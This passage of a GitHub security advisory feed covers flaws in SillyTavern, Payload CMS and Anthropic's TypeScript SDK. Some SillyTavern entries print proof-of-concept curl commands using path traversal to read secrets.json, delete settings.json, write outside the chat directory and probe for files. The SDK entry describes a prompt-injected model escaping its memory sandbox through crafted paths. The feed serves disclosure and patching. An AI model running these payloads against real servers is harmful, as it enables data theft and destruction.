<p>Server-side request forgery with partial restrictions. An authenticated user can force the server to fetch from internal hosts on default ports (80/443) using hostnames or IPv6 addresses that bypass the IP check. The full response body is returned. Lower severity than a fully unrestricted SSRF due to the port limitation.</p>
<h2 id="resolution">Resolution</h2>
<p>The issue was addressed in version 1.17.0 by improving IPv6 address validation</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-wm7j-m6jm-8797">https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-wm7j-m6jm-8797</a></li>
<li><a href="https://github.com/advisories/GHSA-wm7j-m6jm-8797">https://github.com/advisories/GHSA-wm7j-m6jm-8797</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wm7j-m6jm-8797</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:42:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sillytavern] SillyTavern: Path Traversal in `/api/chats/export` and `/api/chats/delete` allows arbitrary file read/delete within user data root]]></title>
        <id>https://github.com/advisories/GHSA-vprr-q85p-79mf</id>
        <link href="https://github.com/advisories/GHSA-vprr-q85p-79mf"/>
        <updated>2026-04-01T21:41:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Path Traversal vulnerability in chat endpoints allows an authenticated attacker to read and delete arbitrary files under their user data root (for example <code>secrets.json</code> and <code>settings.json</code>) by supplying <code>avatar_url=".."</code>.</p>
<h3 id="details">Details</h3>
<p>The input validator used by <code>avatar_url</code> blocks only <code>/</code> and NUL bytes, but does not block traversal segments like <code>..</code>.</p>
<p>Evidence:</p>
<ul>
<li>Weak validator regex (does not reject <code>..</code>):<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/middleware/validateFileName.js#L24-L27">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/middleware/validateFileName.js#L24-L27</a></li>
<li>Vulnerable delete path construction:<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L575-L577">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L575-L577</a></li>
<li>Vulnerable export path construction:<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L595-L598">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L595-L598</a></li>
<li>Endpoint auth context (authenticated user access):<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/server-main.js#L239">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/server-main.js#L239</a></li>
</ul>
<p>Because <code>avatar_url=".."</code> is accepted, <code>path.join(&lt;user&gt;/chats, "..")</code> resolves to <code>&lt;user&gt;/</code>, enabling direct access to files outside the chats directory.</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites:</p>
<ul>
<li>Valid authenticated session cookie (<code>cookie.txt</code>)</li>
<li>Valid CSRF token (<code>$TOKEN</code>)</li>
</ul>
<p>Read sensitive file (<code>secrets.json</code>):</p>
<pre><code class="language-bash">curl -b cookie.txt -H "x-csrf-token: $TOKEN" -H "content-type: application/json" \
  -d '{"avatar_url":"..","is_group":false,"file":"secrets.json","format":"jsonl","exportfilename":"x"}' \
  http://TARGET:8000/api/chats/export
</code></pre>
<p>Delete sensitive file (<code>settings.json</code>):</p>
<pre><code class="language-bash">curl -b cookie.txt -H "x-csrf-token: $TOKEN" -H "content-type: application/json" \
  -d '{"avatar_url":"..","chatfile":"settings.json"}' \
  http://TARGET:8000/api/chats/delete
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Confidentiality: exposed per-user secrets and config data.</li>
<li>Integrity/Availability: attacker can delete critical per-user files and break account operation.</li>
<li>Risk is significant in multi-user or remotely reachable deployments.</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The issue was addressed in version 1.17.0</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-vprr-q85p-79mf">https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-vprr-q85p-79mf</a></li>
<li><a href="https://github.com/advisories/GHSA-vprr-q85p-79mf">https://github.com/advisories/GHSA-vprr-q85p-79mf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vprr-q85p-79mf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T21:41:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sillytavern] SillyTavern: Path Traversal allows file existence oracle]]></title>
        <id>https://github.com/advisories/GHSA-525j-2hrj-m8fp</id>
        <link href="https://github.com/advisories/GHSA-525j-2hrj-m8fp"/>
        <updated>2026-04-01T21:40:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A path traversal vulnerability in the static file route handler allows any unauthenticated user to determine whether files exist anywhere on the server's filesystem. By sending percent-encoded <code>../</code> sequences (<code>%2E%2E%2F</code>) in requests to static file routes, an attacker can check for the existence of files (404 if it doesn't exist, 403 means it exists).</p>
<h3 id="details">Details</h3>
<p>The vulnerability is in <code>createRouteHandler</code> (<code>src/users.js:947–963</code>), which backs all user-data static file routes:</p>
<pre><code class="language-javascript">function createRouteHandler(directoryFn) {
    return async (req, res) =&gt; {
        const directory = directoryFn(req);
        const filePath = decodeURIComponent(req.params[0]);
        const exists = fs.existsSync(path.join(directory, filePath)); // no boundary check here
        if (!exists) {
            return res.sendStatus(404);
        }
        return res.sendFile(filePath, { root: directory });
    };
}
</code></pre>
<p><code>req.params[0]</code> contains the raw (percent-encoded) wildcard from the URL. After <code>decodeURIComponent</code>, a request path like <code>/characters/%2E%2E%2F%2E%2E%2FUsers/kirakira</code> decodes to <code>../../Users/kirakira</code>, and <code>path.join</code> resolves it outside the intended directory. <code>res.sendFile</code> correctly blocks the file from being served (the <code>send</code> module's root check returns 403), but <code>fs.existsSync</code> had already run, and the 403/404 distinction reveals the result.</p>
<p>Affected routes (they all use the same handler, so they're all affected):</p>
<ul>
<li><code>/characters/*</code></li>
<li><code>/user/files/*</code></li>
<li><code>/assets/*</code></li>
<li><code>/user/images/*</code></li>
<li><code>/backgrounds/*</code></li>
<li><code>/User%20Avatars/*</code></li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">curl -o /dev/null -s -w "%{http_code}\n" "http://localhost:8000/characters/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FUsers/kirakira/something"
</code></pre>
<h3 id="impact">Impact</h3>
<p>While file contents cannot be read (the <code>send</code> module blocks actual delivery), anyone who can reach the SillyTavern HTTP port can check the existence of files on the host filesystem.</p>
<h3 id="resolution">Resolution</h3>
<p>The issue was addressed in version 1.17.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-525j-2hrj-m8fp">https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-525j-2hrj-m8fp</a></li>
<li><a href="https://github.com/advisories/GHSA-525j-2hrj-m8fp">https://github.com/advisories/GHSA-525j-2hrj-m8fp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-525j-2hrj-m8fp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:40:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sillytavern] SillyTavern has a path traversal in `/api/chats/import` allows arbitrary file write outside intended chat directory]]></title>
        <id>https://github.com/advisories/GHSA-xvww-xhx6-22pf</id>
        <link href="https://github.com/advisories/GHSA-xvww-xhx6-22pf"/>
        <updated>2026-04-01T21:36:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A path traversal vulnerability in <code>/api/chats/import</code> allows an authenticated attacker to write attacker-controlled files outside the intended chats directory by injecting traversal sequences into <code>character_name</code>.</p>
<h3 id="details">Details</h3>
<p><code>character_name</code> is used unsafely as part of the destination filename and then passed into <code>path.join(...)</code> without sanitization.</p>
<p>Evidence:</p>
<ul>
<li>Import handler entrypoint:<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L680-L686">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L680-L686</a></li>
<li>Unsanitized <code>character_name</code> used in output filename:<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L719-L723">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L719-L723</a></li>
<li>Same write pattern in JSONL import branch:<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L759-L766">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/endpoints/chats.js#L759-L766</a></li>
<li>Endpoint auth context (authenticated user access):<br><a href="https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/server-main.js#L239">https://github.com/SillyTavern/SillyTavern/blob/b7bb8be35a5c779b4db12a4a5b94d7e49096071c/src/server-main.js#L239</a></li>
</ul>
<p>Example payload:</p>
<ul>
<li><code>character_name=../../../../tmp/st_poc</code></li>
</ul>
<p>This causes the final destination path to escape from <code>&lt;user&gt;/chats/&lt;avatar&gt;/...</code> and write to an attacker-controlled location such as <code>/tmp/...</code> (or any writable path for the service account).</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites:</p>
<ul>
<li>Valid authenticated session cookie (<code>cookie.txt</code>)</li>
<li>Valid CSRF token (<code>$TOKEN</code>)</li>
</ul>
<p>Prepare payload:</p>
<pre><code class="language-bash">printf '{"user_name":"u","chat_metadata":{}}\n{"name":"u","mes":"owned"}\n' &gt;/tmp/poc.jsonl
</code></pre>
<p>Trigger arbitrary write:</p>
<pre><code class="language-bash">curl -b cookie.txt -H "x-csrf-token: $TOKEN" \
  -F "avatar=@/tmp/poc.jsonl" \
  -F "file_type=jsonl" \
  -F "avatar_url=a.png" \
  -F "character_name=../../../../tmp/st_poc" \
  -F "user_name=u" \
  http://TARGET:8000/api/chats/import
</code></pre>
<p>Observed result:</p>
<ul>
<li>A file is created outside chats directory, for example:<br><code>/tmp/st_poc - &lt;timestamp&gt; imported.jsonl</code></li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li>Integrity: attacker can create files in unintended filesystem locations.</li>
<li>Availability: can be used for disk abuse and disruptive file placement.</li>
<li>Can become more severe when chained with other local processing behaviors.</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The issue was addressed in version 1.17.0</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-xvww-xhx6-22pf">https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-xvww-xhx6-22pf</a></li>
<li><a href="https://github.com/advisories/GHSA-xvww-xhx6-22pf">https://github.com/advisories/GHSA-xvww-xhx6-22pf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvww-xhx6-22pf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T21:36:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[payload] Payload has a CSRF Protection Bypass in Authentication Flow]]></title>
        <id>https://github.com/advisories/GHSA-p6mr-xf3r-ghq4</id>
        <link href="https://github.com/advisories/GHSA-p6mr-xf3r-ghq4"/>
        <updated>2026-04-01T21:36:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Cross-Site Request Forgery (CSRF) vulnerability existed in the authentication flow. Under certain conditions, the configured CSRF protection could be bypassed, allowing cross-site requests to be made.</p>
<p>Consumers are affected if ALL of these are true:</p>
<ul>
<li>Payload version <strong>&lt; v3.79.1</strong></li>
<li><code>serverURL</code> is configured</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in <strong>v3.79.1</strong>. Additional validation has been added to the authentication flow.</p>
<p>Consumers should upgrade to <strong>v3.79.1</strong> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no complete workaround without upgrading. </p>
<p>If consumers cannot upgrade immediately, setting <code>cookies.sameSite</code> to <code>'Strict'</code> will prevent the session cookie from being sent cross-site. However, this will also require users to re-authenticate when navigating to the application from external links (e.g. email, other sites).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-p6mr-xf3r-ghq4">https://github.com/payloadcms/payload/security/advisories/GHSA-p6mr-xf3r-ghq4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34749">https://nvd.nist.gov/vuln/detail/CVE-2026-34749</a></li>
<li><a href="https://github.com/payloadcms/payload/releases/tag/v3.79.1">https://github.com/payloadcms/payload/releases/tag/v3.79.1</a></li>
<li><a href="https://github.com/advisories/GHSA-p6mr-xf3r-ghq4">https://github.com/advisories/GHSA-p6mr-xf3r-ghq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p6mr-xf3r-ghq4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:36:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[payload] Payload has Authenticated SSRF via Upload Functionality]]></title>
        <id>https://github.com/advisories/GHSA-6r7f-q7f5-wpx8</id>
        <link href="https://github.com/advisories/GHSA-6r7f-q7f5-wpx8"/>
        <updated>2026-04-01T21:25:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An authenticated Server-Side Request Forgery (SSRF) vulnerability existed in the upload functionality.</p>
<p>Authenticated users with <code>create</code> or <code>update</code> access to an upload-enabled collection could cause the server to make outbound HTTP requests to arbitrary URLs.</p>
<p>Consumers are affected if ALL of these are true:</p>
<ul>
<li>Payload version <strong>&lt; v3.79.1</strong></li>
<li>At least one collection with <code>upload</code> enabled</li>
<li>An authenticated user has <code>create</code> or <code>update</code> access to that collection</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in <strong>v3.79.1</strong>. Users should upgrade to <strong>v3.79.1</strong> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Until consumers can upgrade:</p>
<ul>
<li>Restrict <code>create</code> and <code>update</code> access to upload-enabled collections to trusted roles only.</li>
<li>Limit outbound network access from your Payload server where possible.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-6r7f-q7f5-wpx8">https://github.com/payloadcms/payload/security/advisories/GHSA-6r7f-q7f5-wpx8</a></li>
<li><a href="https://github.com/advisories/GHSA-6r7f-q7f5-wpx8">https://github.com/advisories/GHSA-6r7f-q7f5-wpx8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6r7f-q7f5-wpx8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T21:25:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@payloadcms/next] @payloadcms/next has Stored XSS in Admin Panel]]></title>
        <id>https://github.com/advisories/GHSA-mmxc-95ch-2j7c</id>
        <link href="https://github.com/advisories/GHSA-mmxc-95ch-2j7c"/>
        <updated>2026-04-01T21:24:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A stored Cross-site Scripting (XSS) vulnerability existed in the admin panel. An authenticated user with write access to a collection could save content that, when viewed by another user, would execute in their browser.</p>
<p>Consumers are affected if ALL of these are true:</p>
<ul>
<li>Payload version <strong>&lt; v3.78.0</strong></li>
<li>At least one collection with versions enabled</li>
<li>An authenticated user has <code>create</code> or <code>update</code> access to that collection</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in <strong>v3.78.0</strong>. Output encoding has been added to prevent user-supplied content from being interpreted as markup.</p>
<p>Users should upgrade to <strong>v3.78.0</strong> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If consumers cannot upgrade immediately:</p>
<ul>
<li>Restrict <code>create</code> and <code>update</code> access to versioned collections to trusted roles only.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-mmxc-95ch-2j7c">https://github.com/payloadcms/payload/security/advisories/GHSA-mmxc-95ch-2j7c</a></li>
<li><a href="https://github.com/advisories/GHSA-mmxc-95ch-2j7c">https://github.com/advisories/GHSA-mmxc-95ch-2j7c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mmxc-95ch-2j7c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T21:24:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[payload] Payload has an SQL Injection via Query Handling]]></title>
        <id>https://github.com/advisories/GHSA-7xxh-373w-35vg</id>
        <link href="https://github.com/advisories/GHSA-7xxh-373w-35vg"/>
        <updated>2026-04-01T21:19:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Certain request inputs were not properly validated. An attacker could craft requests that influence SQL query execution, potentially exposing or modifying data in collections.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been fixed in <strong>v3.79.1</strong> and later. Query input validation has been hardened.</p>
<p>Upgrade to <strong>v3.79.1 or later</strong>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Until developers can upgrade:</p>
<ul>
<li>Limit access to endpoints that accept dynamic query inputs to trusted users only.  </li>
<li>Validate or sanitize input from untrusted clients before sending it to query endpoints.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-7xxh-373w-35vg">https://github.com/payloadcms/payload/security/advisories/GHSA-7xxh-373w-35vg</a></li>
<li><a href="https://github.com/advisories/GHSA-7xxh-373w-35vg">https://github.com/advisories/GHSA-7xxh-373w-35vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xxh-373w-35vg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T21:19:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@anthropic-ai/sdk] Claude SDK for TypeScript: Memory Tool Path Validation Allows Sandbox Escape to Sibling Directories]]></title>
        <id>https://github.com/advisories/GHSA-5474-4w2j-mq4c</id>
        <link href="https://github.com/advisories/GHSA-5474-4w2j-mq4c"/>
        <updated>2026-04-01T21:16:49.000Z</updated>
        <content type="html"><![CDATA[<p>The local filesystem memory tool in the Anthropic TypeScript SDK validated model-supplied paths using a string prefix check that did not append a trailing path separator. A model steered by prompt injection could supply a crafted path that resolved to a sibling directory sharing the memory root's name as a prefix, allowing reads and writes outside the sandboxed memory directory.</p>
<p>Users on the affected versions are advised to update to the latest version.</p>
<p>Claude SDK for TypeScript thanks <a href="https://hackerone.com/nicksim">hackerone.com/nicksim</a> for reporting this issue!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/anthropics/anthropic-sdk-typescript/security/advisories/GHSA-5474-4w2j-mq4c">https://github.com/anthropics/anthropic-sdk-typescript/security/advisories/GHSA-5474-4w2j-mq4c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34451">https://nvd.nist.gov/vuln/detail/CVE-2026-34451</a></li>
<li><a href="https://github.com/anthropics/anthropic-sdk-typescript/commit/0ac69b3438ee9c96b21a7d3c39c07b7cdb6995d9">https://github.com/anthropics/anthropic-sdk-typescript/commit/0ac69b3438ee9c96b21a7d3c39c07b7cdb6995d9</a></li>
<li><a href="https://github.com/anthropics/anthropic-sdk-typescript/releases/tag/sdk-v0.81.0">https://github.com/anthropics/anthropic-sdk-typescript/releases/tag/sdk-v0.81.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5474-4w2j-mq4c">https://github.com/advisories/GHSA-5474-4w2j-mq4c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5474-4w2j-mq4c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:16:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@payloadcms/graphql] Payload has Unvalidated Input in Password Recovery Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-hp5w-3hxx-vmwf</id>
        <link href="https://github.com/advisories/GHSA-hp5w-3hxx-vmwf"/>
        <updated>2026-04-01T16:08:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability in the password recovery flow could allow an unauthenticated attacker to perform actions on behalf of a user who initiates a password reset.</p>
<p>Users are affected if:</p>
<ul>
<li>They are using Payload version <strong>&lt; v3.79.1</strong> with any auth-enabled collection using the built-in <code>forgot-password</code> functionality.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Input validation and URL construction in the password recovery flow have been hardened.</p>
<p>Users should upgrade to <strong>v3.79.1</strong> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no complete workarounds. Upgrading to <strong>v3.79.1</strong> is recommended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-hp5w-3hxx-vmwf">https://github.com/payloadcms/payload/security/advisories/GHSA-hp5w-3hxx-vmwf</a></li>
<li><a href="https://github.com/payloadcms/payload/releases/tag/v3.79.1">https://github.com/payloadcms/payload/releases/tag/v3.79.1</a></li>
<li><a href="https://github.com/advisories/GHSA-hp5w-3hxx-vmwf">https://github.com/advisories/GHSA-hp5w-3hxx-vmwf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hp5w-3hxx-vmwf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-01T16:08:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[payload] Payload has Unvalidated Input in Password Recovery Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-hp5w-3hxx-vmwf</id>
        <link href="https://github.com/advisories/GHSA-hp5w-3hxx-vmwf"/>
        <updated>2026-04-01T16:08:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability in the password recovery flow could allow an unauthenticated attacker to perform actions on behalf of a user who initiates a password reset.</p>
<p>Users are affected if:</p>
<ul>
<li>They are using Payload version <strong>&lt; v3.79.1</strong> with any auth-enabled collection using the built-in <code>forgot-password</code> functionality.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Input validation and URL construction in the password recovery flow have been hardened.</p>
<p>Users should upgrade to <strong>v3.79.1</strong> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no complete workarounds. Upgrading to <strong>v3.79.1</strong> is recommended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-hp5w-3hxx-vmwf">https://github.com/payloadcms/payload/security/advisories/GHSA-hp5w-3hxx-vmwf</a></li>
<li><a href="https://github.com/payloadcms/payload/releases/tag/v3.79.1">https://github.com/payloadcms/payload/releases/tag/v3.79.1</a></li>
<li><a href="https://github.com/advisories/GHSA-hp5w-3hxx-vmwf">https://github.com/advisories/GHSA-hp5w-3hxx-vmwf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hp5w-3hxx-vmwf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-01T16:08:02.000Z</published>
    </entry>
</feed>